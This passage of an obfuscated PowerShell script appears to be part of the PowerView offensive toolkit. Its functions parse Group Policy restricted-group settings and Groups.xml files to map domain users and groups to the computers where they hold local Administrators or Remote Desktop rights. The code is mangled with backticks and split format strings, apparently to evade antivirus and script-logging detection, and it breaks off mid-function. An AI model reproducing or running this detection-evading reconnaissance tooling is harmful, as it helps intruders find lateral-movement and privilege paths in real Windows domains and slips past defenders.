        ${C`O`NVeRtarGumEn`TS} = @{}
        if (${Ps`BOUNDPaRamE`TE`Rs}[("{1}{0}"-f 'in','Doma')]) { ${C`onve`RTA`RguME`NTS}[("{1}{0}"-f'omain','D')] = ${Do`M`Ain} }
        if (${Ps`BoUNdPara`MEt`ERS}[("{0}{1}"-f'S','erver')]) { ${c`o`N`V`ErTaRgum`eNTs}[("{0}{1}"-f'Ser','ver')] = ${s`e`RVEr} }
        if (${PSB`O`Un`dpARAME`Ters}[("{1}{0}{2}" -f 'redenti','C','al')]) { ${CONVer`TaRG`Um`eN`TS}[("{1}{2}{3}{0}"-f'l','C','re','dentia')] = ${C`REdeN`Tial} }

        ${sPlIto`Pt`I`ON} =  ( GI ('V'+'Ar'+'IaBle:Pcd') )."v`AlUE"::"r`EMoveem`pTy`en`TRi`ES"
    }

    PROCESS {
        if (${p`s`B`oUN`dpARaMet`ers}[("{1}{2}{0}"-f'y','Iden','tit')]) { ${SEArc`H`erA`Rgum`E`Nts}[("{1}{2}{0}" -f'tity','Ide','n')] = ${ideNTI`Ty} }

        &("{0}{3}{2}{1}" -f'Get-D','ainGPO','m','o') @SearcherArguments | &("{2}{1}{0}{3}" -f'c','rEa','Fo','h-Object') {
            ${gpO`DI`SpLA`y`NAME} = ${_}."dI`SpL`A`YnaMe"
            ${gp`O`NAME} = ${_}."N`AMe"
            ${g`pOP`ATH} = ${_}."GPCf`IL`eSY`SP`Ath"

            ${pA`RsEAR`Gs} =  @{ ("{3}{2}{0}{1}" -f 'P','ath','Tmpl','Gpt') = ("$GPOPath\MACHINE\Microsoft\Windows "+('NT{0'+'}SecEdi'+'t{0}Gp'+'tTmpl.i'+'n'+'f')  -F [Char]92) }
            if (${PSbOuN`DpArame`T`ERS}[("{2}{1}{0}" -f 'l','a','Credenti')]) { ${p`A`RSeAr`gs}[("{1}{3}{0}{2}"-f'tia','Cred','l','en')] = ${cReD`e`NtIal} }

            
            ${I`NF} = &("{2}{1}{0}"-f'l','mp','Get-GptT') @ParseArgs

            if (${I`Nf} -and (${i`NF}."P`SBa`SE"."Ke`ys" -contains ("{1}{2}{0}{3}"-f 'bers','Gro','up Mem','hip'))) {
                ${m`E`mB`eRSHIps} = @{}

                
                ForEach (${m`e`MbERsHIp} in ${I`NF}.'Group Membership'.("{0}{4}{1}{2}{3}" -f 'GetEn','er','at','or','um').Invoke()) {
                    ${g`Ro`UP}, ${rElAT`i`ON} = ${meMbE`Rs`HIp}."k`Ey".("{0}{1}"-f'Spli','t').Invoke('__', ${s`PLi`ToPt`Ion}) | &("{2}{3}{0}{1}" -f 'h-Ob','ject','Fo','rEac') {${_}.("{0}{1}" -f'Tri','m').Invoke()}
                    
                    ${meM`BE`RSHIPVA`lue} = ${mEM`BEr`SHIp}."Val`Ue" | &("{1}{0}{2}"-f 'r','Whe','e-Object') {${_}} | &("{0}{1}{3}{2}" -f 'ForE','ach-','ect','Obj') { ${_}.("{1}{0}"-f 'm','Tri').Invoke('*') } | &("{1}{2}{0}"-f'ect','Wher','e-Obj') {${_}}

                    if (${PS`B`OUNdPARAm`e`TERs}[("{4}{0}{5}{2}{3}{1}" -f'e','Ds','sTo','SI','Resolv','Member')]) {
                        
                        ${gRoUpM`e`mBerS} = @()
                        ForEach (${m`emBEr} in ${MemBer`s`h`Ipva`L`Ue}) {
                            if (${m`E`MBER} -and (${Me`mb`er}.("{0}{1}" -f 'Tr','im').Invoke() -ne '')) {
                                if (${m`EmB`ER} -notmatch ("{1}{0}" -f '*','^S-1-.')) {
                                    ${CO`N`VErT`To`ArGumE`Nts} = @{("{2}{0}{1}" -f'jectN','ame','Ob') = ${ME`MB`er}}
                                    if (${P`SbOundp`A`RaM`eTERs}[("{1}{0}" -f'in','Doma')]) { ${Con`VERT`T`OaRgUmenTs}[("{1}{2}{0}" -f'in','D','oma')] = ${Dom`AiN} }
                                    ${Me`MBeR`sID} = &("{1}{2}{0}"-f'D','Conv','ertTo-SI') @ConvertToArguments

                                    if (${Me`MB`ersID}) {
                                        ${Gro`U`PMeMB`eRs} += ${M`EMBErS`Id}
                                    }
                                    else {
                                        ${G`ROu`p`mEMBERs} += ${MEmB`er}
                                    }
                                }
                                else {
                                    ${gR`OuPME`mberS} += ${M`eMber}
                                }
                            }
                        }
                        ${MeM`BE`RShi`PVALUe} = ${gRou`pM`eMb`eRS}
                    }

                    if (-not ${mEmbe`R`SH`Ips}[${g`R`OuP}]) {
                        ${M`e`mbeRS`hIpS}[${gRo`UP}] = @{}
                    }
                    if (${ME`mBERsH`ipva`L`Ue} -isnot [System.Array]) {${mEM`BErsHi`P`VAl`UE} = @(${ME`Mb`ER`sHi`PVAlue})}
                    ${mEMBE`R`s`hiPS}[${G`R`ouP}].("{1}{0}" -f 'dd','A').Invoke(${r`ELAtIoN}, ${meMBER`shi`pvaL`Ue})
                }

                ForEach (${ME`mBER`S`HiP} in ${mE`mBEr`sH`iPs}.("{2}{0}{4}{1}{3}"-f 'En','ra','Get','tor','ume').Invoke()) {
                    if (${MEmB`E`RsHIP} -and ${MemBeR`s`h`ip}."k`eY" -and (${M`em`BE`RShiP}."K`ey" -match '^\*')) {
                        
                        ${g`Roup`SiD} = ${MEMB`e`R`SHip}."k`EY".("{1}{0}"-f 'rim','T').Invoke('*')
                        if (${gR`O`Up`SID} -and (${grO`UPSID}.("{0}{1}"-f 'Tr','im').Invoke() -ne '')) {
                            ${GRO`Up`NAme} = &("{1}{3}{2}{0}{4}"-f'm-S','Co','Fro','nvert','ID') -ObjectSID ${g`ROU`psid} @ConvertArguments
                        }
                        else {
                            ${groUP`Na`me} = ${Fa`LsE}
                        }
                    }
                    else {
                        ${GRou`P`NaME} = ${mE`MbERSh`ip}."k`ey"

                        if (${groU`p`NAmE} -and (${GRouP`N`A`ME}.("{0}{1}"-f'Tr','im').Invoke() -ne '')) {
                            if (${GR`o`U`pnamE} -match ("{0}{1}{2}"-f'Admi','nistrat','ors')) {
                                ${g`RoU`PSid} = ("{0}{2}{1}" -f 'S-1-','-544','5-32')
                            }
                            elseif (${GRoU`P`NaMe} -match ("{1}{2}{4}{0}{3}" -f 't','Rem','o','op','te Desk')) {
                                ${g`R`OUP`SId} = ("{1}{2}{0}{3}" -f '2-','S','-1-5-3','555')
                            }
                            elseif (${GROu`P`NAme} -match ("{0}{1}"-f 'Gu','ests')) {
                                ${g`R`Ou`PSiD} = ("{0}{2}{1}"-f'S-1-','-32-546','5')
                            }
                            elseif (${groU`PN`AME}.("{0}{1}"-f'T','rim').Invoke() -ne '') {
                                ${C`onVe`RtTOaRGuM`ENTS} = @{("{0}{2}{1}" -f'O','tName','bjec') = ${G`ROUpnA`ME}}
                                if (${psBo`Un`dp`AR`AmeTERS}[("{0}{1}"-f'Doma','in')]) { ${co`NVe`Rt`T`O`ArGU`MEntS}[("{0}{1}"-f'D','omain')] = ${dOm`A`IN} }
                                ${GROu`ps`Id} = &("{2}{3}{0}{1}"-f 'tTo-S','ID','C','onver') @ConvertToArguments
                            }
                            else {
                                ${g`Ro`UPSid} = ${Nu`Ll}
                            }
                        }
                    }

                    ${Gpo`gRo`Up} = &("{1}{0}{2}" -f'ew-Obje','N','ct') ("{2}{1}{0}" -f 't','ec','PSObj')
                    ${gp`O`GROUp} | &("{1}{2}{0}"-f 'Member','Ad','d-') ("{2}{1}{0}"-f 'rty','prope','Note') ("{1}{0}{2}{3}"-f 'ODi','GP','s','playName') ${Gp`oDIsP`lAYn`AMe}
                    ${gp`OGrO`UP} | &("{1}{0}{2}" -f'-Mem','Add','ber') ("{1}{2}{0}" -f 'rty','Note','prope') ("{2}{1}{0}"-f 'e','PONam','G') ${g`PoNAME}
                    ${g`P`ogROuP} | &("{3}{1}{0}{2}"-f 'embe','dd-M','r','A') ("{0}{2}{1}"-f'Note','erty','prop') ("{2}{0}{1}"-f 'Pat','h','GPO') ${GP`O`path}
                    ${gpo`gR`oUp} | &("{1}{3}{2}{0}" -f 'r','Add-Me','e','mb') ("{1}{2}{0}"-f 'rty','Notepr','ope') ("{0}{1}"-f'GP','OType') ("{0}{2}{1}{3}"-f'Restr','Gro','icted','ups')
                    ${GPO`gRoUp} | &("{1}{0}{2}" -f 'Membe','Add-','r') ("{2}{1}{0}{3}" -f 't','teproper','No','y') ("{2}{1}{0}" -f'ers','t','Fil') ${nU`lL}
                    ${G`POg`R`OuP} | &("{1}{2}{0}"-f'er','Add-Mem','b') ("{1}{2}{0}"-f'rty','Note','prope') ("{1}{2}{0}"-f'ame','Gro','upN') ${groUpn`A`me}
                    ${gp`o`gRoUP} | &("{2}{1}{3}{0}"-f 'r','dd-Me','A','mbe') ("{2}{1}{3}{0}" -f'ty','op','Notepr','er') ("{0}{1}" -f 'Gr','oupSID') ${GR`ouPS`Id}
                    ${gPo`gR`o`UP} | &("{0}{1}{2}" -f'Ad','d','-Member') ("{2}{1}{0}"-f'erty','teprop','No') ("{0}{1}{2}" -f 'GroupM','e','mberOf') ${ME`mBeR`S`hip}."V`AlUe"."me`Mbe`ROf"
                    ${g`p`OgroUP} | &("{1}{0}{2}"-f'dd-M','A','ember') ("{2}{0}{1}"-f 'oteproper','ty','N') ("{1}{2}{0}"-f'ers','GroupM','emb') ${me`m`B`eRShIp}."V`AlUE"."M`Em`BeRS"
                    ${gP`oGRo`UP}."P`sobJe`Ct"."T`YpE`NAMES".("{0}{1}"-f'In','sert').Invoke(0, ("{2}{3}{4}{0}{1}"-f'GPO','Group','PowerV','i','ew.'))
                    ${g`P`OGRoup}
                }
            }

            
            ${Pa`Rse`ARgs} =  @{
                ("{1}{2}{0}" -f'ath','GroupsXM','Lp') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            &("{3}{0}{1}{2}"-f'roup','s','XML','Get-G') @ParseArgs | &("{3}{0}{2}{1}"-f'E','ch-Object','a','For') {
                if (${pS`BOUND`pAR`AmEtErs}[("{1}{4}{3}{2}{0}" -f's','Reso','sToSID','mber','lveMe')]) {
                    ${Gr`oUPm`Em`BerS} = @()
                    ForEach (${m`Ember} in ${_}."gRO`Upm`EmBers") {
                        if (${mE`MB`eR} -and (${mEm`BER}.("{1}{0}"-f'm','Tri').Invoke() -ne '')) {
                            if (${mEmb`Er} -notmatch ("{0}{1}{2}"-f '^S','-1','-.*')) {

                                
                                ${coNveR`T`ToaRgumEn`TS} = @{("{2}{0}{1}"-f'N','ame','Object') = ${gRO`UpN`Ame}}
                                if (${pSb`o`UnDPa`RaMeteRS}[("{1}{0}" -f'main','Do')]) { ${C`ON`VErT`TOA`R`guMeNtS}[("{2}{0}{1}" -f'ma','in','Do')] = ${D`O`maiN} }
                                ${M`EmBerS`id} = &("{3}{1}{2}{0}" -f'ID','o-','S','ConvertT') -Domain ${D`o`mAIn} -ObjectName ${me`mber}

                                if (${mem`BERs`iD}) {
                                    ${g`R`OUpm`em`BerS} += ${MEm`BERS`Id}
                                }
                                else {
                                    ${G`R`OUPMEmB`Ers} += ${MEMb`eR}
                                }
                            }
                            else {
                                ${GroupME`Mb`E`Rs} += ${M`EM`Ber}
                            }
                        }
                    }
                    ${_}."Gr`oUPM`e`MBErs" = ${G`RO`UPM`eMBers}
                }

                ${_} | &("{2}{1}{3}{0}" -f'er','dd-Mem','A','b') ("{2}{0}{1}"-f'teproper','ty','No') ("{0}{3}{1}{2}" -f'GPOD','splayN','ame','i') ${GpODiS`pl`A`Yna`Me}
                ${_} | &("{3}{0}{1}{2}"-f'M','embe','r','Add-') ("{2}{1}{0}{3}"-f 'ert','oteprop','N','y') ("{2}{0}{1}"-f 'm','e','GPONa') ${g`po`Name}
                ${_} | &("{1}{2}{0}" -f 'er','Add-Me','mb') ("{1}{3}{0}{2}"-f'teproper','N','ty','o') ("{0}{1}" -f 'GPOT','ype') ("{0}{2}{3}{1}"-f 'GroupPo','es','licyPrefere','nc')
                ${_}."Psob`jecT"."Typ`EnaMEs".("{0}{1}" -f 'I','nsert').Invoke(0, ("{0}{3}{2}{1}{4}"-f'Pow','OGr','iew.GP','erV','oup'))
                ${_}
            }
        }
    }
}


function GET-DoMa`INg`PouSE`RlOcA`l`groUPM`ApPInG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{1}{0}{3}"-f 'Proces','d','l','s','PSShou'}, '')]
    [OutputType({"{1}{5}{2}{0}{3}{4}"-f'LocalG','P','User','roupMapp','ing','owerView.GPO'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSiTioN = 0, VALUEfroMPipELInE = ${Tr`Ue}, vaLUEFRoMpIPEliNEbYpROpertynAMe = ${Tr`UE})]
        [Alias({"{2}{3}{1}{4}{0}"-f'hedName','ui','Dist','ing','s'}, {"{2}{0}{1}{3}"-f 'u','ntN','SamAcco','ame'}, {"{0}{1}"-f 'Nam','e'})]
        [String]
        ${I`dEntI`TY},

        [String]
        [ValidateSet({"{0}{1}{2}"-f'Admin','istrator','s'}, {"{3}{0}{1}{2}"-f '3','2-5','44','S-1-5-'}, 'RDP', {"{4}{1}{2}{0}{5}{3}"-f ' Deskt','mot','e','s','Re','op User'}, {"{0}{3}{2}{1}"-f'S-1','555','5-32-','-'})]
        ${l`O`C`ALGrOUp} = ("{2}{0}{3}{1}" -f 'dministr','ors','A','at'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADS','Path'})]
        [String]
        ${SeaRCH`BA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}{4}"-f'Do','nC','o','mai','ntroller'})]
        [String]
        ${s`ERV`Er},

        [ValidateSet({"{0}{1}"-f'B','ase'}, {"{0}{1}"-f 'OneLeve','l'}, {"{0}{2}{1}"-f 'S','e','ubtre'})]
        [String]
        ${SEAr`cHSc`o`Pe} = ("{2}{0}{1}" -f 'bt','ree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESuL`Tp`A`gESi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`e`RvERTIMELIM`IT},

        [Switch]
        ${to`MBS`T`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrED`ENTI`Al} =   (GET-ITem ("{1}{0}{3}{2}{4}" -f 'IaBLe','vAr','tQ',':7','02')  )."VaL`UE"::"e`mpTy"
    )

    BEGIN {
        ${C`oMMon`ARGU`M`entS} = @{}
        if (${psbo`UnDPAR`Am`e`TERs}[("{1}{0}{2}"-f 'o','D','main')]) { ${coM`mO`NAr`G`UmEnts}[("{1}{0}"-f'n','Domai')] = ${Do`maIN} }
        if (${ps`BOUndP`ArAMete`RS}[("{1}{0}" -f 'er','Serv')]) { ${C`ommon`ARGUM`Ents}[("{0}{1}" -f 'S','erver')] = ${SE`RVEr} }
        if (${Psb`oUND`p`Ara`mEte`RS}[("{0}{2}{1}"-f'Search','pe','Sco')]) { ${c`OMmOna`RguMENTS}[("{0}{2}{1}" -f'Se','cope','archS')] = ${S`eArchs`C`OpE} }
        if (${psbOun`dP`Ar`AmEte`RS}[("{1}{2}{0}" -f 'Size','Result','Page')]) { ${COm`mO`N`Ar`GumenTS}[("{2}{1}{3}{0}" -f 'Size','es','R','ultPage')] = ${RE`SulTpAg`e`s`iZE} }
        if (${PsBOu`Nd`p`ArA`mETErS}[("{0}{3}{2}{1}"-f'Ser','eLimit','im','verT')]) { ${cOmmo`NarG`UMEn`TS}[("{3}{0}{2}{1}"-f'erTim','Limit','e','Serv')] = ${SERVer`TiM`EL`imit} }
        if (${PsB`OUnDPA`RA`Met`eRs}[("{0}{2}{1}" -f 'Tombs','ne','to')]) { ${CO`M`M`onAr`guMEnts}[("{1}{0}{2}"-f'on','Tombst','e')] = ${T`OM`BStOne} }
        if (${ps`BouN`dpAram`eT`E`Rs}[("{1}{0}{2}" -f 'edent','Cr','ial')]) { ${comMONArgu`M`E`N`TS}[("{0}{1}{2}" -f'Cred','ent','ial')] = ${c`Reden`TiAl} }
    }

    PROCESS {
        ${T`ARGEtsI`DS} = @()

        if (${psbo`UN`Dp`AR`AMEtE`Rs}[("{1}{0}{2}"-f'denti','I','ty')]) {
            ${Tar`gE`TSIds} += &("{0}{3}{1}{4}{2}" -f'G','-DomainOb','t','et','jec') @CommonArguments -Identity ${ID`E`NtiTY} | &("{1}{0}{2}{3}" -f'bj','Select-O','ec','t') -Expand ("{0}{2}{1}" -f 'o','ctsid','bje')
            ${TAr`gEtoBJe`ctS`ID} = ${taR`GetSI`DS}
            if (-not ${tarGet`s`i`DS}) {
                Throw ('[G'+'et-Do'+'ma'+'in'+'G'+'POUserLocalGro'+'u'+'pMapping'+'] '+'Unabl'+'e '+'to'+' '+'re'+'triev'+'e '+'S'+'ID '+'fo'+'r '+'i'+'denti'+'t'+'y '+"'$Identity'")
            }
        }
        else {
            
            ${tA`Rg`ETSI`dS} = @('*')
        }

        if (${LocAl`gr`OUP} -match ("{1}{0}"-f '-5','S-1')) {
            ${t`A`RgETlOC`AL`SID} = ${l`Oca`lg`Roup}
        }
        elseif (${LO`CAlGR`Oup} -match ("{0}{1}"-f'A','dmin')) {
            ${TARGet`l`oc`ALs`iD} = ("{1}{0}{2}" -f'1-5-3','S-','2-544')
        }
        else {
            
            ${tA`R`GEtLOCa`LSID} = ("{3}{1}{0}{2}" -f'5','1-5-32-5','5','S-')
        }

        if (${Ta`RGe`Tsi`ds}[0] -ne '*') {
            ForEach (${tA`RGe`T`SId} in ${Ta`Rg`e`TSiDs}) {
                &("{0}{2}{1}"-f 'Wr','rbose','ite-Ve') ('['+'Get-D'+'omain'+'G'+'POU'+'serL'+'o'+'calG'+'roupM'+'a'+'ppin'+'g] '+'E'+'num'+'eratin'+'g '+'nest'+'e'+'d '+'gr'+'oup '+'member'+'s'+'h'+'ips '+'fo'+'r: '+"'$TargetSid'")
                ${TarG`e`TSI`ds} += &("{4}{2}{1}{3}{0}" -f'p','Domain','-','Grou','Get') @CommonArguments -Properties ("{2}{1}{0}" -f 'tsid','jec','ob') -MemberIdentity ${TA`RgET`S`Id} | &("{1}{0}{2}" -f'ct','Sele','-Object') -ExpandProperty ("{2}{1}{0}" -f'sid','ct','obje')
            }
        }

        &("{2}{3}{0}{1}" -f '-','Verbose','Wr','ite') ('['+'G'+'et-D'+'omainGPOUs'+'e'+'r'+'L'+'o'+'c'+'a'+'lGroupMap'+'ping] '+'T'+'ar'+'get '+'l'+'ocalg'+'ro'+'up '+'SID:'+' '+"$TargetLocalSID")
        &("{0}{2}{3}{1}"-f 'Write-','se','V','erbo') ('[G'+'et'+'-DomainG'+'POUserLocalGro'+'up'+'M'+'a'+'p'+'ping] '+'Ef'+'fect'+'ive '+'target'+' '+'domai'+'n'+' '+'SID'+'s: '+"$TargetSIDs")

        ${Gp`Ogrou`pS} = &("{3}{6}{4}{1}{2}{0}{5}"-f 'lGro','m','ainGPOLoca','Ge','-Do','up','t') @CommonArguments -ResolveMembersToSIDs | &("{1}{2}{3}{0}" -f'Object','F','o','rEach-') {
            ${g`p`OGRouP} = ${_}
            
            if (${Gpo`gRo`UP}."gRoup`s`id" -match ${tArGe`T`Lo`CalSid}) {
                ${Gp`OGr`OuP}."gr`o`Upme`mBERs" | &("{1}{2}{0}"-f 'bject','W','here-O') {${_}} | &("{4}{0}{1}{3}{2}" -f 'or','Each-','bject','O','F') {
                    if ( (${t`ARGE`T`siDS}[0] -eq '*') -or (${TA`RgeTSi`Ds} -Contains ${_}) ) {
                        ${g`poGROUP}
                    }
                }
            }
            
            if ( (${GP`Og`ROUP}."gr`OuPmEm`B`ErOF" -contains ${ta`RGETLOc`ALSid}) ) {
                if ( (${taRGE`TSi`DS}[0] -eq '*') -or (${tAr`Ge`TsIDS} -Contains ${gPo`groUP}."GRoUPs`Id") ) {
                    ${Gpog`R`OUP}
                }
            }
        } | &("{2}{1}{0}"-f 'Object','ort-','S') -Property ("{1}{0}"-f 'OName','GP') -Unique

        ${g`po`grOuPS} | &("{0}{2}{3}{1}" -f'W','ect','here-Ob','j') {${_}} | &("{2}{0}{1}"-f'ch-','Object','ForEa') {
            ${g`PONa`me} = ${_}."gPOdI`SPLA`YN`AME"
            ${gP`OgU`id} = ${_}."Gp`onA`me"
            ${Gpo`pAth} = ${_}."gP`OP`ATH"
            ${G`potyPE} = ${_}."G`potyPe"
            if (${_}."GROUpm`emb`erS") {
                ${g`POmemb`ers} = ${_}."GROU`Pm`EMBErS"
            }
            else {
                ${gpo`MEM`BErS} = ${_}."g`Rou`pSID"
            }

            ${f`il`TErs} = ${_}."fi`LTErs"

            if (${ta`RGe`T`sIDS}[0] -eq '*') {
                
                ${T`A`RgetOBJECtS`I`Ds} = ${GpOm`E`mBERS}
            }
            else {
                ${Ta`RGEtOB`jec`TS`ids} = ${T`A`RGEtobjEcTS`Id}
            }

            
            &("{0}{1}{3}{2}"-f 'Get-D','oma','OU','in') @CommonArguments -Raw -Properties ("{0}{3}{2}{4}{1}"-f'name','hedname','i',',d','stinguis') -GPLink ${g`pog`UID} | &("{2}{1}{4}{3}{0}"-f 't','o','F','Objec','rEach-') {
                if (${fI`lTERs}) {
                    ${oUCOMPu`T`e`Rs} = &("{0}{1}{2}{3}"-f 'Get-','Doma','inC','omputer') @CommonArguments -Properties ("{0}{2}{5}{4}{3}{1}"-f 'd','tinguishedname','ns','dis','name,','host') -SearchBase ${_}."pA`Th" | &("{2}{1}{0}{3}" -f 'Ob','-','Where','ject') {${_}."DIS`TINgUIs`h`edNamE" -match (${fI`LtE`RS}."v`ALuE")} | &("{2}{0}{1}{3}"-f 't-Obj','e','Selec','ct') -ExpandProperty ("{1}{2}{0}" -f'name','dn','shost')
                }
                else {
                    ${oUCO`mpU`TERS} = &("{5}{4}{0}{2}{1}{3}"-f'omai','Com','n','puter','D','Get-') @CommonArguments -Properties ("{1}{2}{0}" -f'e','dnshostn','am') -SearchBase ${_}."PA`Th" | &("{0}{1}{2}"-f'Select','-Obj','ect') -ExpandProperty ("{2}{1}{0}"-f'e','tnam','dnshos')
                }

                if (${O`UcO`MPUte`RS}) {
                    if (${OU`cOm`putE`RS} -isnot [System.Array]) {${oucom`Pu`T`ErS} = @(${oU`cOMPU`TErS})}

                    ForEach (${TA`RGEt`siD} in ${TArgetOb`JECt`s`iDS}) {
                        ${o`BJe`ct} = &("{4}{5}{1}{3}{2}{0}" -f 'ect','om','nObj','ai','Get','-D') @CommonArguments -Identity ${t`ARGE`T`siD} -Properties ("{12}{7}{3}{10}{1}{13}{11}{2}{5}{9}{8}{6}{0}{14}{4}" -f'dname','ac','d','ttype,sa','ectsid','is','uishe','n','ing','t','m','ntname,','samaccou','cou',',obj')

                        ${i`sg`ROup} = @(("{2}{0}{1}"-f'435','456','268'),("{1}{0}{3}{2}"-f '843','26','7','545'),("{1}{0}{2}" -f'8709','536','12'),("{0}{1}{2}" -f'536','8','70913')) -contains ${ObJ`e`Ct}."sAmACc`ou`NTtY`pe"

                        ${Gpo`lOc`ALgRo`Up`mApp`InG} = &("{1}{0}{2}"-f '-Ob','New','ject') ("{0}{1}" -f'PSOb','ject')
                        ${gp`O`locA`LgrO`Upm`APpiNg} | &("{0}{1}{2}" -f'Add-','Membe','r') ("{0}{2}{1}" -f'N','erty','oteprop') ("{0}{2}{1}" -f'O','me','bjectNa') ${o`B`ject}."sAmaCcO`U`N`T`NaMe"
                        ${gpO`L`ocaLGrO`U`P`MAPpINg} | &("{1}{2}{0}" -f'Member','A','dd-') ("{1}{3}{2}{0}"-f'ty','Note','roper','p') ("{2}{0}{1}"-f 'jec','tDN','Ob') ${O`B`JECT}."d`i`StIngu`ish`edNamE"
                        ${G`PoLOcalG`ROU`pMAppiNG} | &("{3}{0}{1}{2}" -f'd','-M','ember','Ad') ("{1}{2}{0}{3}" -f 't','Noteprop','er','y') ("{1}{0}{2}" -f't','Objec','SID') ${OB`J`ECt}."ob`jEct`sID"
                        ${GpoLo`CAlGR`O`UPmaPpInG} | &("{0}{1}{2}"-f'Add','-M','ember') ("{2}{3}{1}{0}" -f 'rty','ope','Not','epr') ("{0}{1}" -f 'Domai','n') ${dO`MaiN}
                        ${Gp`o`lO`CAlgRoUp`mApP`INg} | &("{2}{0}{1}"-f '-Memb','er','Add') ("{0}{2}{1}" -f 'Notepro','ty','per') ("{2}{0}{1}"-f 'G','roup','Is') ${Isg`Roup}
                        ${GpoL`oCaLGR`oUp`MAPp`inG} | &("{0}{1}{2}" -f'A','dd-Me','mber') ("{2}{0}{1}{3}"-f't','e','No','property') ("{1}{2}{3}{0}" -f'Name','GPOD','ispl','ay') ${GP`O`NaME}
                        ${Gp`oLOcAlgRo`UPMa`Ppi`Ng} | &("{1}{0}{2}{3}"-f'd-Mem','Ad','b','er') ("{0}{3}{1}{2}" -f'Note','ert','y','prop') ("{0}{1}{2}"-f 'GPO','G','uid') ${Gpo`G`Uid}
                        ${G`pOlOCALg`R`OU`P`mAPPING} | &("{0}{2}{1}" -f 'Add-Mem','er','b') ("{2}{1}{0}" -f'ty','oteproper','N') ("{1}{2}{0}"-f 'th','G','POPa') ${G`Pop`ATH}
                        ${gpOLoC`A`LGRoUpMAPpI`NG} | &("{3}{2}{0}{1}"-f '-M','ember','d','Ad') ("{3}{1}{0}{2}" -f 'pe','epro','rty','Not') ("{1}{0}"-f 'OType','GP') ${gPoT`ype}
                        ${gP`OLo`CalGrOUpmA`Pp`I`NG} | &("{2}{1}{0}" -f 'mber','e','Add-M') ("{1}{0}{3}{2}" -f'pe','Notepro','y','rt') ("{0}{1}{2}{3}" -f'Co','ntainer','N','ame') ${_}."pR`opERti`eS"."d`isTiNG`UISheDn`AMe"
                        ${gp`oloC`ALGR`OUpMa`PPiNg} | &("{0}{1}{2}"-f 'Add','-Membe','r') ("{0}{1}{3}{2}"-f 'N','oteprope','ty','r') ("{1}{0}{2}"-f 'p','Com','uterName') ${OuCo`MP`Ut`eRS}
                        ${GpO`LOCa`l`GroUPmaP`pI`Ng}."psObJ`e`ct"."TYpe`NaM`eS".("{1}{0}" -f 'nsert','I').Invoke(0, ("{2}{1}{5}{4}{6}{0}{3}"-f 'POLoca','owerV','P','lGroupMapping','ew','i','.G'))
                        ${gpolo`c`AL`gro`UPm`AP`Ping}
                    }
                }
            }

            
            &("{4}{2}{1}{0}{3}"-f'it','t-DomainS','e','e','G') @CommonArguments -Properties ("{5}{4}{3}{0}{2}{1}"-f'dn','me','a','objectbl,distinguishe','ite','s') -GPLink ${GpOG`UId} | &("{1}{3}{2}{0}" -f'ect','For','h-Obj','Eac') {
                ForEach (${tA`RGE`TSID} in ${tarG`et`Obj`ECTS`i`DS}) {
                    ${OBJ`e`CT} = &("{0}{2}{3}{1}{4}" -f'Get-D','jec','omainO','b','t') @CommonArguments -Identity ${t`ARGEt`s`ID} -Properties ("{11}{0}{10}{7}{3}{8}{2}{6}{1}{4}{5}{9}"-f'nttype,sa','am','n','m','e,objects','i','guishedn','untna','e,disti','d','macco','samaccou')

                    ${ISg`ROup} = @(("{1}{0}{2}" -f'4','268','35456'),("{0}{2}{1}"-f '26843','457','5'),("{1}{0}" -f '6870912','53'),("{2}{1}{0}" -f '13','709','5368')) -contains ${O`BJeCT}."S`AMa`CCo`UnT`TYpe"

                    ${GP`oloCAlG`ROUP`MApPInG} = &("{1}{2}{0}" -f 'ject','N','ew-Ob') ("{1}{0}{2}"-f'bje','PSO','ct')
                    ${Gp`olOC`A`LGRoUPMa`PP`Ing} | &("{0}{1}{2}"-f'Add-','M','ember') ("{1}{3}{2}{0}"-f 'rty','No','prope','te') ("{0}{2}{1}" -f 'Obje','e','ctNam') ${obJ`ect}."s`AMaCc`OU`NTNaMe"
                    ${Gpo`lOCaL`G`R`OUpMap`PiNg} | &("{0}{2}{1}" -f 'Add','Member','-') ("{0}{1}{2}"-f'N','otepropert','y') ("{2}{1}{0}" -f'DN','t','Objec') ${Ob`j`EcT}."diSTing`UI`sHE`dNAME"
                    ${G`PO`lo`CaLGRoU`PmappInG} | &("{3}{0}{1}{2}" -f 'd-','Mem','ber','Ad') ("{1}{3}{2}{0}" -f 'rty','Not','rope','ep') ("{2}{0}{1}"-f'bjec','tSID','O') ${O`BJECt}."Ob`jECtS`Id"
                    ${GpOL`oc`AlGrOU`P`M`Ap`ping} | &("{0}{1}{2}"-f'Add','-Mem','ber') ("{2}{1}{3}{0}" -f'rty','tepro','No','pe') ("{0}{1}{2}"-f'I','s','Group') ${Is`g`ROUp}
                    ${g`P`o`Lo`CalgrO`UP`MAPPiNg} | &("{0}{1}{2}"-f 'Add','-Membe','r') ("{0}{2}{1}{3}" -f'Not','pro','e','perty') ("{1}{0}" -f 'omain','D') ${do`maIN}
                    ${gP`o`loCa`lg`RoU`pmAP`PiNG} | &("{0}{2}{1}"-f 'A','ber','dd-Mem') ("{0}{1}{3}{2}" -f 'No','tepro','rty','pe') ("{3}{2}{0}{1}" -f 'Na','me','lay','GPODisp') ${GPo`N`AMe}
                    ${g`PoLOc`ALGr`oUp`mapPinG} | &("{2}{1}{0}{3}" -f 'embe','M','Add-','r') ("{2}{1}{3}{0}" -f'y','teproper','No','t') ("{1}{0}{2}" -f'POGu','G','id') ${gp`Oguid}
                    ${GPoLo`caLgroup`mA`pPi`Ng} | &("{2}{1}{0}"-f 'ember','d-M','Ad') ("{0}{1}{3}{2}"-f 'N','ot','operty','epr') ("{0}{2}{1}"-f 'GPO','th','Pa') ${g`POPa`TH}
                    ${GpOlO`cAlGrO`UP`mAPP`i`NG} | &("{2}{1}{0}" -f'r','embe','Add-M') ("{0}{1}{3}{2}"-f'N','otepr','perty','o') ("{1}{0}{2}" -f'POT','G','ype') ${gPOty`Pe}
